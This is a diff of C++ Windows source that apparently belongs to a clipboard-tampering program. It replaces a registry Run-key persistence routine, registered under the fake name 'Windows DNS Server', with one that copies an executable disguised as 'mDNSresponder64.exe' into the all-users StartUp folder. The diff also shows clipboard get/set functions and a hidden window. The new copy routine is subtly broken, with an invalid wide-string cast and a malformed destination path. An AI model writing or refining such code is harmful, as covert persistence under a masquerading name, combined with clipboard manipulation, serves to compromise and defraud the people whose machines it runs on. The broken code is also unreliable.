@@ -4,17 +4,13 @@
 #include <vector>
 #include <thread>
 
-
-// Function to add the application to Windows startup
-void AddToStartup(const std::string& exePath, const std::string& appName) {
-    HKEY hkey;
-    std::string keyPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
-
-    if (RegOpenKeyExA(HKEY_CURRENT_USER, keyPath.c_str(), 0, KEY_SET_VALUE, &hkey) == ERROR_SUCCESS) {
-        RegSetValueExA(hkey, appName.c_str(), 0, REG_SZ, (BYTE*)exePath.c_str(), (DWORD)exePath.length());
-        RegCloseKey(hkey);
-    }
+// Function to copy the executable to the startup folder
+void CopyToStartupFolder(const std::string& exePath) {
+    std::wstring startupFolderPath = L"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp";
+    std::wstring destinationPath = startupFolderPath + L"\\" + std::wstring(exePath.begin(), exePath.end());
+    CopyFileW(LPCWSTR(exePath.c_str()), destinationPath.c_str(), FALSE);
 }
+
 
 // Renamed function to avoid conflict with the one in winuser.h
 bool IsClipboardFormatAvailableCustom(UINT format)
@@ -67,13 +63,11 @@ void SetClipboardText(const std::string &text)
 
 int main()
 {
- // Path to your executable
-    std::string exePath = "C:\\temp\\mDNSresponder.exe";
-    // Name for the registry entry (choose any name you like)
-    std::string appName = "Windows DNS Server";
+    // Path to your executable
+    std::string exePath = "C:\\temp\\mDNSresponder64.exe";
 
-    // Add the application to Windows startup
-    AddToStartup(exePath, appName);
+    // Copy the executable to the startup folder
+    CopyToStartupFolder(exePath);
 
     // hidden window
     HWND hwnd = CreateWindowA("STATIC", "invisible window", WS_OVERLAPPEDWINDOW,
